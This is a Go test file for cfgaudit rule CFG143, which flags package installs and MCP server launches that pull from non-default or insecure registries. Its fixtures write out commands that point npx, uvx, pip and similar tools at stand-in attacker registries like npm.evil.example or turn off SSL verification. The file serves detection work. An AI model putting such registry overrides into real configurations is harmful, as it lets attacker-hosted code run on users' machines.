// Copyright the cfgaudit contributors
// SPDX-License-Identifier: Apache-2.0

package rules

import (
	"strings"
	"testing"

	"github.com/cfgaudit/cfgaudit/internal/finding"
	"github.com/cfgaudit/cfgaudit/internal/parser"
)

func mcpRegistryTarget(command string, env map[string]string, args ...string) *Target {
	return &Target{
		ProjectMCPFile: ".mcp.json",
		ProjectMCP:     map[string]parser.MCPServer{"srv": {Command: command, Args: args, Env: env}},
	}
}

// The commands of #1683 and their relatives as MCP launches, at their
// severity; the public registries, a value from a variable or a prompt, and
// options after the package are not reported.
func TestCFG143_MCP1683(t *testing.T) {
	for _, tc := range []struct {
		command string
		args    []string
		env     map[string]string
		want    finding.Severity
	}{
		{"npx", []string{"-y", "--registry", "https://npm.evil.example", "my-mcp@1.0.0"}, nil, finding.Warn},
		{"npx", []string{"-y", "--registry=http://npm.evil.example", "my-mcp@1.0.0"}, nil, finding.Error},
		{"npx", []string{"-y", "--@corp:registry=https://npm.pkg.github.com", "@corp/mcp@1.0.0"}, nil, finding.Warn},
		{"npx", []string{"-y", "--strict-ssl=false", "my-mcp@1.0.0"}, nil, finding.Error},
		{"npx", []string{"-y", "--no-strict-ssl", "my-mcp@1.0.0"}, nil, finding.Error},
		{"uvx", []string{"--index-url", "https://pypi.evil.example/simple", "my-mcp==1.0"}, nil, finding.Warn},
		{"uvx", []string{"-i", "http://pypi.evil.example/simple", "my-mcp==1.0"}, nil, finding.Error},
		{"uvx", []string{"--extra-index-url", "https://pkgs.internal.example/simple", "my-mcp==1.0"}, nil, finding.Error},
		{"uvx", []string{"--index", "internal=https://pkgs.internal.example/simple", "my-mcp==1.0"}, nil, finding.Error},
		{"uvx", []string{"--default-index", "https://mirror.example/simple", "my-mcp==1.0"}, nil, finding.Warn},
		{"uvx", []string{"--allow-insecure-host", "pkgs.internal.example", "my-mcp==1.0"}, nil, finding.Error},
		{"uvx", []string{"--find-links", "https://files.evil.example/wheels/", "my-mcp==1.0"}, nil, finding.Warn},
		{"uv", []string{"tool", "run", "--index-url", "https://mirror.example/simple", "my-mcp"}, nil, finding.Warn},
		{"pipx", []string{"run", "--index-url", "https://mirror.example/simple", "my-mcp"}, nil, finding.Warn},
		{"npx", []string{"-y", "my-mcp@1.0.0"}, map[string]string{"NPM_CONFIG_REGISTRY": "https://npm.evil.example"}, finding.Warn},
		{"npx", []string{"-y", "my-mcp@1.0.0"}, map[string]string{"npm_config_strict_ssl": "false"}, finding.Error},
		{"uvx", []string{"my-mcp==1.0"}, map[string]string{"UV_INDEX_URL": "https://mirror.example/simple"}, finding.Warn},
		{"uvx", []string{"my-mcp==1.0"}, map[string]string{"UV_EXTRA_INDEX_URL": "https://pypi.org/simple https://pkgs.internal.example/simple"}, finding.Error},
		{"uvx", []string{"my-mcp==1.0"}, map[string]string{"PIP_TRUSTED_HOST": "pkgs.internal.example"}, finding.Error},
		{"env", []string{"UV_INDEX_URL=https://mirror.example/simple", "uvx", "my-mcp==1.0"}, nil, finding.Warn},
		// A local registry over http is no network path, but still the repository's choice.
		{"npx", []string{"--registry", "http://localhost:4873", "my-mcp"}, nil, finding.Warn},
	} {
		f := CFG143.Check(mcpRegistryTarget(tc.command, tc.env, tc.args...))
		if len(f) != 1 || f[0].Severity != tc.want {
			t.Errorf("%s %v %v: want one %s finding, got %+v", tc.command, tc.args, tc.env, tc.want, f)
		}
	}
	for _, tc := range []struct {
		command string
		args    []string
		env     map[string]string
	}{
		{"npx", []string{"-y", "my-mcp@1.0.0"}, nil},
		{"uvx", []string{"my-mcp==1.0"}, nil},
		{"npx", []string{"--registry", "https://registry.npmjs.org", "my-mcp@1.0.0"}, nil},
		{"npx", []string{"--registry=https://registry.yarnpkg.com/", "my-mcp@1.0.0"}, nil},
		{"uvx", []string{"--index", "https://pypi.org/simple", "--default-index", "https://pypi.org/simple", "my-mcp"}, nil},
		{"npx", []string{"--registry=${input:registryString}", "my-mcp"}, nil},
		{"uvx", []string{"--index-url", "$PIP_INDEX", "my-mcp"}, nil},
		// After the package, options belong to the server.
		{"npx", []string{"-y", "@azure-devops/mcp", "--registry", "https://npm.evil.example"}, nil},
		{"uvx", []string{"my-mcp", "--index-url", "https://pypi.evil.example/simple"}, nil},
		{"uvx", []string{"--find-links", "./wheels", "my-mcp"}, nil},
		// The variable is for another tool.
		{"node", []string{"server.js"}, map[string]string{"NPM_CONFIG_REGISTRY": "https://npm.evil.example"}},
		{"npx", []string{"-y", "my-mcp"}, map[string]string{"UV_INDEX_URL": "https://mirror.example/simple"}},
		{"docker", []string{"run", "--registry", "https://x.example", "img"}, nil},
	} {
		if f := CFG143.Check(mcpRegistryTarget(tc.command, tc.env, tc.args...)); len(f) != 0 {
			t.Errorf("%s %v %v: want no finding, got %+v", tc.command, tc.args, tc.env, f)
		}
	}
}

// Hooks, tasks and `!` blocks install packages too; pip install takes its
// options anywhere.
func TestCFG143_CommandSites1683(t *testing.T) {
	for _, tc := range []struct {
		cmd  string
		want finding.Severity
	}{
		{`pip install --extra-index-url https://pkgs.internal.example/simple mytool`, finding.Error},
		{`pip install mytool --index-url https://mirror.example/simple`, finding.Warn},
		{`python3 -m pip install --trusted-host pkgs.internal.example mytool`, finding.Error},
		{`uv pip install -i http://mirror.example/simple mytool`, finding.Error},
		{`cd "$CLAUDE_PROJECT_DIR" && npm install --registry https://npm.evil.example`, finding.Warn},
		{`PIP_INDEX_URL=https://mirror.example/simple pip install mytool`, finding.Warn},
		{`pnpm dlx --registry https://npm.evil.example tool`, finding.Warn},
		{`bun x --registry https://npm.evil.example tool`, finding.Warn},
		{`yarn dlx --registry https://npm.evil.example tool`, finding.Warn},
		{`uv add --index https://pkgs.internal.example/simple mytool`, finding.Error},
		{`python3.12 -m pip install -i https://mirror.example/simple mytool`, finding.Warn},
		{`npx --registry "https://[bad" tool`, finding.Warn},
	} {
		f := CFG143.Check(hookTarget(t, tc.cmd))
		if len(f) != 1 || f[0].Severity != tc.want {
			t.Errorf("%s: want one %s finding, got %+v", tc.cmd, tc.want, f)
		}
	}
	for _, cmd := range []string{
		`pip install -r requirements.txt`,
		`npm install`,
		`echo "use --registry https://npm.evil.example"`,
		`npm run build -- --registry https://npm.evil.example`,
		`pip list --index-url https://mirror.example/simple`,
		`npm install -- --registry https://npm.evil.example`,
		`uv`,
		`python3.12 -m venv .venv`,
	} {
		if f := CFG143.Check(hookTarget(t, cmd)); len(f) != 0 {
			t.Errorf("%s: want no finding, got %+v", cmd, f)
		}
	}

	tasks := &Target{
		VSCodeTasksFile: ".vscode/tasks.json",
		VSCodeTasks: &parser.VSCodeTasks{Tasks: []parser.VSCodeTask{
			{Label: "deps", Command: "pip install --extra-index-url https://pkgs.internal.example/simple -r requirements.txt"},
		}},
	}
	if f := CFG143.Check(tasks); len(f) != 1 || f[0].Severity != finding.Error || !strings.Contains(f[0].Message, `VS Code task "deps"`) {
		t.Errorf("task: %+v", f)
	}
}

// One finding per command lists every source, at the highest severity.
func TestCFG143_Message1683(t *testing.T) {
	f := CFG143.Check(mcpRegistryTarget("uvx", map[string]string{"UV_INDEX_URL": "https://mirror.example/simple"},
		"--extra-index-url", "https://pkgs.internal.example/simple", "my-mcp==1.0"))
	if len(f) != 1 || f[0].Severity != finding.Error {
		t.Fatalf("got %+v", f)
	}
	for _, want := range []string{`mcpServers.srv command`, `"--extra-index-url https://pkgs.internal.example/simple"`, `"UV_INDEX_URL=https://mirror.example/simple"`, "replaces the real one"} {
		if !strings.Contains(f[0].Message, want) {
			t.Errorf("message lacks %q: %s", want, f[0].Message)
		}
	}
	remote := &Target{ProjectMCPFile: ".mcp.json", ProjectMCP: map[string]parser.MCPServer{"r": {URL: "https://example.com/mcp"}}}
	if f := CFG143.Check(remote); len(f) != 0 {
		t.Errorf("remote: %+v", f)
	}
	if CFG143.Check(nil) != nil || CFG143.ID() != "CFG143" {
		t.Error("nil target or ID")
	}
	if f := CFG143.Check(hookTarget(t, `npx --registry https://a.example x; npx --registry https://a.example x`)); len(f) != 1 {
		t.Errorf("duplicate: %+v", f)
	}
}
